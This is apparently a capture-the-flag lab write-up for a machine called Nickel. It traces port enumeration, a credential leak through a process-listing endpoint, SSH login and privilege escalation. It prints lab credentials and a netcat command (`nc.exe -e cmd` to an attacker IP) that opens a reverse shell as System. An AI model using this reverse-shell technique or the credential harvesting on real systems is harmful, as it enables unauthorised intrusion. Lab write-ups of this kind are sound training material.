# Nickel

### Port Scan
![port-scan](images/port-scan.png)

## Procedure
🔎 Port 8089 is hosting a web page with some actions.\
![dashboard](images/dashboard.png)

🔎 The actions are mapped with an IP of a different host.\
![dashboard-source](images/dashboard-source.png)

🔎 Port 33333 is also open on this host. The response indicate that GET request
may not be enabled for the endpoints.\
![get-request](images/get-request.png)

🔑 Using POST requests to list running processes expose a command with the
credentials of the user "ariah" and her password which is base64-encoded
`ariah:NowiseSloopTheory139`.\
![running-procs](images/running-procs.png)

🔎 Connecting to the server via ssh to get access as ariah.\
![user-info](images/user-info.png)

🏳 User flag.\
![user-flag](images/user-flag.png)

🔎 The user doesn't have access to the system information.\
![system-info](images/system-info.png)

🔎 Other information found in the `list-running-procs` endpoint was the location
of some scripts.\
![web-scripts](images/web-scripts.png)

🔎 Downloading and inspecting them reveal that port 80 may be running a web
server with an endpoint to execute commands.\
![script-comment](images/script-comment.png)
![script](images/script.png)

🔎 It seems that the port is actively listening to connections.\
![netstat](images/netstat.png)

🔎 The port is running the script as System.\
![local-server](images/local-server.png)

🔎 Upload a netcat binary.\
![upload-netcat](images/upload-netcat.png)

💀 With the URL-encoded `C:/temp/nc.exe -e cmd 192.168.49.97 80` command spawn a
reverse shell as System.\
![reverse-shell](images/reverse-shell.png)

🏴 Administrator flag.\
![admin-flag](images/admin-flag.png)